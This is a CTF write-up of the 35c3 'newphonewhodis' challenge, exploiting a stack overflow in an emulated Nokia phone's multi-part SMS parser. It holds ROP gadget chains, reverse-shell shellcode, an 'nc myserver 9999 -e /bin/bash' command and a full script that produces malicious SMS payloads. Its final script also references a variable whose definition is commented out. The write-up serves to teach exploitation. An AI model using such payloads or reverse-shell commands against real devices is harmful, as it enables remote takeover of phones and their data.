## Where do we begin?

There is a phone running somewhere at the 35c3 convention. It is connected to
a GSM network. But there is no radio connection for the physical layer,
instead, all the GSM protocol run over UDP packets that are sent through an
OpenVPN connection.

I ran the `buildall` script, it took a while (I was in the South of Italy
visiting my parents, here internet connection is far from good).  
I ran the `startall` script and only two containers out of 3 came up. One
container was the `baseband`. another one was an `osmocombb` instance with 2
configured phone, and the third one, the one who did not come up, the one that
really matters was an emulator for the Nokia phone.

### Inside the nokia phone  
`nokia_qemu` container is dying just after the start, but this does not stop
us from getting inside and find our binary.  
the container as an `image` folder and inside that we have `nokia-image-
nokia.ext4`. This is the filesystem of our phone. We can mount this and take a
look.  
```bash  
sudo mount ./nokia-image-nokia.ext4 /mnt  
```  
There is a `/flag.txt` file containing:  
```  
If this was the real challenge, you would find the flag here.  
```  
So we at least know where is the flag.  
Inside `/opt/nokia` we have 3 arm32 binaries: `baseband`  `layer1`
`nokia_ui`. So, we probably need to remotely pwn one of those binaries and
read the flag.

### Running the nokia phone  
We definitely need to have a running setup if we want to have any chance of
pwning this.  
So we need to figure out why our docker container is not working.  
To be honest inside the readme there where some hint on how to run the
container. But at that time I was not aware enough of the challenge set up to
actually understand that.  
The Nokia phone is running inside a qemu that is inside the docker container.  
The problem was that it was not able to connect to x11 server to actually
render stuff.

My solution was to change the `-display sdl` into `-vnc :0` from the
`runqemu.sh`.

This enables a vnc server that you need to expose outside the container to
actually have access to it.  
So you need to add a `-p 5900:5900` to you docker running command inside the
`run.sh` script.

Then we can connect to the screen using `vinagre` a vnc client.

![server]({{"https://mhackeroni.it/assets/img/newphonewhodis_writeup/vncphone.png"|absolute_url}})

When the nokia is running you can also connect through ssh as explained by the
`runall.sh` script.

Running `ps` we can actually confirm that those binaries that we found are
actually running on the phone.

```bash  
1172 root      6924 S    /opt/nokia/nokia_ui  
1173 root      1564 S    /sbin/agetty -8 -L ttyAMA0 115200 xterm  
1174 root      4944 S    /usr/sbin/openvpn --daemon --writepid
/var/run/openvpn/gsm.pid --cd /etc/open  
1205 root      5852 S    /opt/nokia/layer1  
1206 root      6124 S    /opt/nokia/baseband  
1209 root      2108 S    /usr/sbin/dropbear -i -r
/etc/dropbear/dropbear_rsa_host_key -B  
```  
## Reversing the binary nokia_ui  
Opening the binary with ida you actually understand that most of the code is
in thumb mode. But my ida fails to identify the code like that. You can use
`Alt+G` to change the flag `T` to let ida know that a segment is actually in
thumb mode.

Playing with the phone you can notice that only 2 main functionalities are
implemented inside the phone.  
- Phonebook  
- SMS

So this phone cannot do voice call. Can only send and receive SMSes. Then we
need to find where those SMSes are actually handled.

Around address `0x12E82` we see this:  
```c  
  if ( v49 == 0x202 )  
   {  
     v51 = osmo_hexdump(recvstuff + 0x11, 163);  
     printf("Received SMS TPDU: %s\n", v51);  
     recv_sms(v44, recvstuff[16], recvstuff + 0x11);  
     JUMPOUT(__CS__, v12);  
   }  
   if ( v49 == 515 )  
   {  
     printf("Received SMS confirmation: msg_ref: %u - cause: %u\n", recvstuff[180], *(recvstuff + 46));  
     if ( recvstuff[181] )  
       sub_13388(v44, recvstuff[180], *(recvstuff + 46));  
   }  
   else if ( v49 == 258 )  
   {  
     printf("Shutdown indication: Old state: %u - New State: %u\n", *(recvstuff + 2), (*(recvstuff + 2) >> 32));  
     if ( *(recvstuff + 5) == 3 )  
       *(v44 + 60) = 1;  
     JUMPOUT(__CS__, v12);  
   }  
   goto LABEL_20;  
```

The `Received SMS TPDU` gives away the fact that the next function is probably
where SMS is interpreted.

Here is the decompiled source from
[`recv_sms`]({{"https://mhaceroni.it/assets/code/newphonewhodis_writeup/recv_sms.c"|absolute_url}}).

There is basically 2 way of receiving SMS:  
- Normal SMS  
- Multi-Part SMS (Concatenated SMS)

To have a multi-part SMS you need to insert inside the SMS payload a User Data
Header
([`UDH`]({{"https://en.wikipedia.org/wiki/User_Data_Header#UDH_Information_Elements"|absolute_url}})).  
You can read the standard but this stuff is well known and can also be found
on Wikipedia [`Concatenated
SMS`]({{"https://en.wikipedia.org/wiki/Concatenated_SMS"|absolute_url}}).

Looking at the Wikipedia page we can compare the standard header for multi-
part SMS with this code:

```c  
 puts("Received SMS with UDH");  
 if ( userbuf->encoded_data[1] )  
 {  
   printf("Got unknown information element in UDH: 0x%02x\n",
userbuf->encoded_data[1]);  
   goto FAIL;  
 }  
 if ( userbuf->encoded_data[0] != 5 )  
 {  
   puts("Concatenated SMS UDH with length != 5?");  
FAIL:  
   puts("Received SMS with malformed/unknown UDH. Discarding...");  
   result = talloc_free(userbuf, 115284);  
   goto LABEL_33;  
 }  
 if ( userbuf->encoded_data[2] != 3 )  
 {  
   puts("Concatenated SMS UDH with header length != 3?");  
   goto FAIL;  
 }  
 nparts = userbuf->encoded_data[4];  
 if ( nparts > 3 )  
 {  
   puts("Too many parts");  
   goto FAIL;  
 }  
 refnum = userbuf->encoded_data[3];  
 seqnum = userbuf->encoded_data[5];  
```

We know that the binary is using the standard UDH format. We can give a name
to all those bytes that the program is parsing.

So basically when you send a multipart SMS you add this header where you write
a `refnum` or `CSMS` that is a unique id to identify the sequence of SMSes.
You have a `nparts` or number of parts that are expected for that SMS. And the
most important `seqnum` a number that says which part of SMS you are handling
(2 means this is the second piece of the SMS).

We also notice that we cannot have SMSes that are bigger than 3 parts.

## The Vulnerability

After a while playing ctfs you know that if the author spent the time to
implement the multi-part SMS protocol that stuff is needed for the attack.

Where multi-part SMSes are actually processed we find this:

```c  
           {  
             if ( !v55 || v55 > 3 )  
               puts("Unknown data coding scheme in sms. Copying raw data after UDH");  
             puts("8 bit encoding");  
             v49 = 134;  
             v50 = *(v47->data + 28);  
             if ( v50 <= 0x8C )  
               v49 = v50 - 6;  
             memcpy(&payload[134 * seqnum - 134], (v47->data + 35), v49);  
           }  
```

This code is actually reconstructing the SMS from all its parties. Copying the
result inside `payload` a variable on the stack.  
`seqnum` is a value that we can control arbitrarily. Even if we are limited to
only 3 parts we can specify that we are sending part number 4 and this will
cause the memcpy to write outside the allocated buffer writing the return
address on the stack gaining control of the `PC`.

## Communicate with the phone  
We need to be able to send SMS to this phone to actually exploit the
vulnerability. Thankfully the author provided us with a full setup that also
contains configured version of
[`osmocombb`]({{"https://github.com/osmocom/osmocom-bb"|absolute_url}})
software.

After a while playing with these software (and actually reading the source
code) I found that if you type enable in the console you can use the `sms`
command to send some SMSes.  
The problem was that the interface was very limited. It was sending only
single sms with the 7bit encoding scheme and was accepting only ASCII
character. I needed to be more flexible to be able to produce multi-part
SMSes.  
I tried to sniff the output of `osmocombb` to be able to write a python
script. But I quickly discovered that the full gsm protocol was involved.  
This includes asking and obtaining a channel to actually communicate with the
baseband. Implementing all this stuff was time consuming and, in ctf, you do
not have much time.  
So, I decided to patch `osmocombb` software to implement a command that let me
send a more customizable sms.

Full patch is available
[`here`]({{"https://mhaceroni.it/assets/code/newphonewhodis_writeup/osmocombb_path.diff"|absolute_url}}).
The interesting stuff is:

Be able to specify that the packet contains a UDH header.  
```c  
  sms->ud_hdr_ind = atoi((char *)argv[1]);  
```  
Specify that the data was 8bit encoded and not 7bit encoded.  
```c  
  sms->data_coding_scheme = 4;  
```  
Write sms as hex encoded so that I could you any value.  
```c  
  char * text_hex = argv_concat(argv, argc, 3);  
  char * text = hex2b(text_hex);  
  int text_len = strlen(text_hex) / 2;  
```

The result is a command like this where I specify that UHD is included and the
sms is hex encoded:

```bash  
smshex one 1 9999
05000317010a170069350100921a05b46b2a0100247017006935010069460b276b2a0100287017006935010001dfc0466b2a01002c70170069350100020012346b2a01003070170069350100253b24286b2a010034701700693501002f62696e6b2a010038701700693501002f7368006b2a01003c7017006935010001701700531f0100  
```

## The attack  
Now we can communicate via SMS with the phone and we also have a
vulnerability.

I wrote a small python function to encode SMSes:

```python  
def encode_part(ref_num, data, CSMS=0x17, max_part=3):  
   assert max_part <= 3  
   header = "\x05\x00\x03" + chr(CSMS) + chr(max_part) + chr(ref_num)  
   return header+data  
```

We can craft few SMSes with payloads from the `cyclic` command of pwntools and
find how to control the PC.

```python  
c =
"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa"

print "smshex one 1 9999",encode_part(4, c[:134], max_part=1).encode("hex")  
```

Now that we control PC challenge is solved right?

Actually was not so easy. Even if it was a nokia phone, in reality, it was a
binary running on a Linux distro. So it had NX bit and ASLR enable. The binary
was not PIE.

When I usually exploit a no PIE binary with ASLR and NX bit, I write a
ropchain that leak something from the `.got` and then read again on top of the
stack for a second stage rop that uses `libc`. But this time I did not have a
connection to the binary. So was very hard to implement a second stage sent
later.

The phone had Internet access and also `nc` installed. So the plan was to
execute:

```c  
system("nc myserver 9999 -e /bin/bash");  
```

`system` was not in the .got so I need to do some computation from a value in
the got to get the address for `system`.  
This stuff is hard while ropping, so the exploitation plan was slightly
different: Let's map some executable address and write a shellcode that does a
reverse connection.

So, I collected a few gadgets and built the ropachain that execute a `mmap` on
an address the I can choose. Permissions for this new page are of course
`RWX`.

```python  
# 0x0001275e : ldr r3, [r5, #0x20] ; cmp r3, r4 ; bne #0x12760 ; ldrd r4, r5,
[sp] ; add sp, #8 ; pop {r6, pc}  
r3load = 0x0001275e  
#0x000128fe : pop {r5, pc}  
r5pop = 0x000128fe  
#0x000118c6 : pop {r4, pc}  
r4pop = 0x000118c6  
#0x000172a6 : pop {r2, r3, r4, pc}  
r234pop = 0x000172a6  
#0x00016c12 : pop {r1, r4, pc}  
r14pop = 0x00016c12  
#0x00015c24 : pop {r0, r3, pc}  
r03pop = 0x00015c24  
#0x00012b4e : pop {r2, pc}  
r2pop = 0x00012b4e  
#0x000111c4 : pop {r3, pc} not thumb  
r3popnothumb = 0x000111c4  
#0x00011f52 : blx r4  
blxr4 = 0x00011f52  
#       void *mmap(void *addr, size_t len, int prot, int flags, int fildes,
off_t off);  
mmap = 0x00011240  
mmap = 0x00013E0C +1  
memcpy = 0x00011410  
memcpy_got = 0x000320C0  
#0x0001fe36 : add r3, sp, #0x2b8  
addr3sp = 0x0001fe36

#0x000176c0 : add r0, sp, #0x1a0 ; movs r1, r0 ; bx lr  
#0x000122c0 : ldm.w ip, {r5, sb, sl, lr} ; add sp, #0x10 ; pop {r4, pc}  
ctrlr = 0x000122c0  
#0x00014b5a : ldr lr, [sp], #4 ; b.w #0x1263e  
setlrjmpr3 = 0x00014b5a  
"""  
Register state when we take control of PC  
r0             0x0                 0  
r1             0x38024             229412  
r2             0x35a70             219760  
r3             0x35a70             219760  
r4             0x61716161          1634820449  
r5             0x61726161          1634885985  
r6             0x61736161          1634951521  
r7             0x61746161          1635017057  
r8             0x61756161          1635082593  
r9             0x61766161          1635148129  
r10            0x61776161          1635213665  
r11            0x61786161          1635279201  
r12            0x7                 7  
sp             0x7efe9b38          0x7efe9b38  
lr             0x3f                63  
pc             0x5a5a5a5a          0x5a5a5a5a  
cpsr           0x600b0110          1611333904  
fpscr          0x10                16  
"""  
address = 0x177000  
stderr = 0x00036E90  
ropchain = c[:74] + p32(stderr) + p32(address) * 4  
ropchain = ropchain.ljust(94, "A")  
ropchain += p32(r3popnothumb)  
ropchain += p32(address) #r3 dont care  
ropchain += p32(r5pop+1)  
ropchain += p32(address) #r5 dont care  
ropchain += p32(r14pop+1)  
ropchain += p32(0x1000) #r1 size  
ropchain += p32(address) #r4 dont care  
ropchain += p32(r234pop+1) #pc  
ropchain += p32(7) #r2 prot  
ropchain += p32(address) #r3 dont care  
ropchain += p32(address) #r4 dont care  
ropchain += p32(r03pop+1) #pc  
ropchain += p32(address) #r0 addr  
ropchain += p32(0x22) #r3 flags Anonimous  
ropchain += p32(mmap)  
ropchain += p32(0x0) #fildes  
ropchain += p32(0x0) #off  
ropchain += p32(0x41414141) #pc  
```

### Gaining back PC Control  
The main problem was that `mmap` assumed to be called with a `BLX`, ergo it
will return to the value inside the `lr` register.  
For whatever reason that I do not know `lr` register was set to `0x3f` so a
direct jump to `mmap` would cause a crash at the end.  
Instead of jumping directly to `mmap` then, we can use a call of `mmap` that
is already in the program somewhere.  
This, after the execution of the `mmap`, would continue the execution in that
part of the program.  
Then we just need to have the program not crashing before reaching another
return that do not use link register.  
I jumped to `0x00013E0C +1`.

```c  
.text:00013E04 200 MOV.W           R2, #3  ; prot  
.text:00013E08 200 ADD             R1, R5  ; len  
.text:00013E0A 200 STR             R5, [R4,#0x58] ; Store to Memory  
.text:00013E0C 200 BLX             mmap    ; Branch with Link and Exchange
(immediate address)  
.text:00013E10 200 ADDS            R3, R0, #1 ; Rd = Op1 + Op2  
.text:00013E12 200 STR             R0, [R4,#0x5C] ; Store to Memory  
.text:00013E14 200 BEQ.W           loc_140F0 ; Bran  
```  
To ensure that the execution would continue without crashing, I tried to set
most registers to `address`. In this way, instructions differentiating those
registers would not end up crashing.  
This actually (and surprisingly) worked. I manually executed my payload with
gdb until the program was popping another value from the stack to the `PC`
register.  
I save the address did some math to understand how far it was from the
vulnerable buffer. With an sms in position `8` we can gain back control of
`PC` register.

### Second Payload  
At this point, we have a page in the memory space with a fixed address where
we can write and jump into.

We need some reliable way to copy a shellcode into this memory and jump to it.  
I tried for several hours to build a call to memcpy but I was not able to put
a stack address into `r1` register. (`r1` is the source register because of
the calling convention of amr32).

Thankfully marcof came out with the idea of building a ropchain that write the
shellcode into memory using registers.

This is the type of gadget that you need:

```python  
# 0x00013568 : str r4, [r3] ; mov r0, r1 ; pop {r4, pc}  
storer4r3 = 0x00013568  
```

You put 4 bytes that you want to write in `r4` and the address where to write
in `r3` and keep doing that until the whole shellcode is written.

The challenge here was to have a chain not too long, because we were close to
env variable on the stack, overwriting env was ending in a crash because used
by some time function.

After several iterations we end up with this script to generate such chain:  
```python  
ropchain_second += p32(r4pop+1) #r4  
ropchain_second += shellcode[0:4] #r4  
for x in range(0, len(shellcode), 4):  
   spiece_next = shellcode[x+4:x+8]  
   if x >= len(shellcode)-4:  
       spiece_next = p32(address+1) # These put jumping address in r4  
       print "done"  
   ropchain_second += p32(popr3+1) #pc  
   ropchain_second += p32(address+x) #r3 value  
   ropchain_second += p32(storer4r3+1) #pc  
   ropchain_second += spiece_next #r4  
#add jump to address  
ropchain_second += p32(blxr4+1)  
```

The other point to keep the chain short was keeping the payload short. We
basically used this [`shellcode`]({{"http://shell-
storm.org/shellcode/files/shellcode-754.php"|absolute_url}}) with small fixes:  
- we removed instruction that jumps in thumb mode (we can do this directly)  
- we changed "/system/bin/sh" in "/bin/sh"  
- we reduce bytes for the port.

This is the final script that produces 5 SMSes. The last one is the one which
triggers the bug so it needs to be the last one.

```python

from pwn import *

def encode_part(ref_num, data, CSMS=0x17, max_part=3):  
   assert max_part <= 3  
   header = "\x05\x00\x03" + chr(CSMS) + chr(max_part) + chr(ref_num)  
   return header+data

c =
"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa"

#r3 load  
# 0x0001275e : ldr r3, [r5, #0x20] ; cmp r3, r4 ; bne #0x12760 ; ldrd r4, r5,
[sp] ; add sp, #8 ; pop {r6, pc}  
r3load = 0x0001275e  
#0x000128fe : pop {r5, pc}  
r5pop = 0x000128fe  
#0x000118c6 : pop {r4, pc}  
r4pop = 0x000118c6  
#0x000172a6 : pop {r2, r3, r4, pc}  
r234pop = 0x000172a6  
#0x00016c12 : pop {r1, r4, pc}  
r14pop = 0x00016c12  
#0x00015c24 : pop {r0, r3, pc}  
r03pop = 0x00015c24  
#0x00012b4e : pop {r2, pc}  
r2pop = 0x00012b4e  
#0x000111c4 : pop {r3, pc} not thumb  
r3popnothumb = 0x000111c4  
#0x00011f52 : blx r4  
blxr4 = 0x00011f52  
#       void *mmap(void *addr, size_t len, int prot, int flags, int fildes,
off_t off);  
mmap = 0x00011240  
mmap = 0x00013E0C +1  
memcpy = 0x00011410  
memcpy_got = 0x000320C0  
#0x0001fe36 : add r3, sp, #0x2b8  
addr3sp = 0x0001fe36

#0x000176c0 : add r0, sp, #0x1a0 ; movs r1, r0 ; bx lr  
#0x000122c0 : ldm.w ip, {r5, sb, sl, lr} ; add sp, #0x10 ; pop {r4, pc}  
ctrlr = 0x000122c0  
#0x00014b5a : ldr lr, [sp], #4 ; b.w #0x1263e  
setlrjmpr3 = 0x00014b5a  
"""  
Register state when we take control of PC  
r0             0x0                 0  
r1             0x38024             229412  
r2             0x35a70             219760  
r3             0x35a70             219760  
r4             0x61716161          1634820449  
r5             0x61726161          1634885985  
r6             0x61736161          1634951521  
r7             0x61746161          1635017057  
r8             0x61756161          1635082593  
r9             0x61766161          1635148129  
r10            0x61776161          1635213665  
r11            0x61786161          1635279201  
r12            0x7                 7  
sp             0x7efe9b38          0x7efe9b38  
lr             0x3f                63  
pc             0x5a5a5a5a          0x5a5a5a5a  
cpsr           0x600b0110          1611333904  
fpscr          0x10                16  
"""  
address = 0x177000  
stderr = 0x00036E90  
ropchain = c[:74] + p32(stderr) + p32(address) * 4  
ropchain = ropchain.ljust(94, "A")  
ropchain += p32(r3popnothumb)  
ropchain += p32(address) #r3 dont care  
ropchain += p32(r5pop+1)  
ropchain += p32(address) #r5 dont care  
ropchain += p32(r14pop+1)  
ropchain += p32(0x1000) #r1 size  
ropchain += p32(address) #r4 dont care  
ropchain += p32(r234pop+1) #pc  
ropchain += p32(7) #r2 prot  
ropchain += p32(address) #r3 dont care  
ropchain += p32(address) #r4 dont care  
ropchain += p32(r03pop+1) #pc  
ropchain += p32(address) #r0 addr  
ropchain += p32(0x22) #r3 flags Anonimous  
ropchain += p32(mmap)  
ropchain += p32(0x0) #fildes  
ropchain += p32(0x0) #off  
ropchain += p32(0x41414141) #pc

"""  
r0             0xffffffff          4294967295  
r1             0x9                 9  
r2             0x76f9c6a0          1996080800  
r3             0xffffffff          4294967295  
r4             0x41414141          1094795585  
r5             0x41414141          1094795585  
r6             0x41414141          1094795585  
r7             0x41414141          1094795585  
r8             0x41414141          1094795585  
r9             0x177000            1536000  
r10            0x177000            1536000  
r11            0x177000            1536000  
r12            0x6                 6  
sp             0x7ed1fd70          0x7ed1fd70  
lr             0x76dde329          1994253097  
pc             0x5a5a5a5a          0x5a5a5a5a  
cpsr           0x200f0110          537854224  
fpscr          0x10                16  
"""

#0x000118c4 : strb r3, [r4] ; pop {r4, pc}  
storer3r4 = 0x000118c4  
#0x00013ad2 : str r2, [r3] ; pop {r4, pc}  
storer2r3 = 0x00013ad2  
# 0x00013568 : str r4, [r3] ; mov r0, r1 ; pop {r4, pc}  
storer4r3 = 0x00013568

ropchain_second = "A"*126

# 0x00012a6a : pop {r3, pc}  
popr3 = 0x00012a6a

shellcode =
"\x02\x20\x01\x21\x92\x1A\x0F\x02\x19\x37\x01\xDF\x06\x1C\x08\xA1\x10\x22\x02\x37\x01\xDF\x3F\x27\x02\x21\x30\x1c\x01\xdf\x01\x39\xFB\xD5\x05\xA0\x92\x1a\x05\xb4\x69\x46\x0b\x27\x01\xDF\xC0\x46\x02\x00\x12\x34\x25\x3b\x24\x28\x2f\x62\x69\x6e\x2f\x73\x68\x00"

print len(shellcode)  
ropchain_second += p32(r4pop+1) #r4  
ropchain_second += shellcode[0:4] #r4  
for x in range(0, len(shellcode), 4):  
   spiece_next = shellcode[x+4:x+8]  
   if x >= len(shellcode)-4:  
       spiece_next = p32(address+1) # These put jumping address in r4  
       print "done"  
   ropchain_second += p32(popr3+1) #pc  
   ropchain_second += p32(address+x) #r3 value  
   ropchain_second += p32(storer4r3+1) #pc  
   ropchain_second += spiece_next #r4  
#add jump to address  
ropchain_second += p32(blxr4+1)

ropchain1 = ropchain[:134]  
ropchain2 = ropchain[134:]

ropchain_second1 = ropchain_second[:134]  
ropchain_second2 = ropchain_second[134:134*2]  
ropchain_second3 = ropchain_second[134*2:134*3]  
# ropchain_second4 = ropchain_second[134*3:]  
print len(ropchain_second4)  
print "smshex one 1 9999", encode_part(5+5, ropchain_second3, max_part=1,
CSMS=23).encode("hex")  
print "smshex one 1 9999", encode_part(5+6, ropchain_second4, max_part=1,
CSMS=24).encode("hex")

# print "smshex one 1 9999", encode_part(5+4, ropchain_second2, max_part=1,
CSMS=21).encode("hex")

print "smshex one 1 9999", encode_part(5+3, ropchain_second1,
max_part=3).encode("hex")  
print "smshex one 1 9999", encode_part(5, ropchain2, max_part=3).encode("hex")  
print "smshex one 1 9999",encode_part(4, ropchain1, max_part=3).encode("hex")

#35C3_n0k1a_pH0ne_i5_b3st_ph0n3  
```

Original writeup (https://mhackeroni.it/archive/2018/12/30/35c3ctf-
newphonewhodis.html).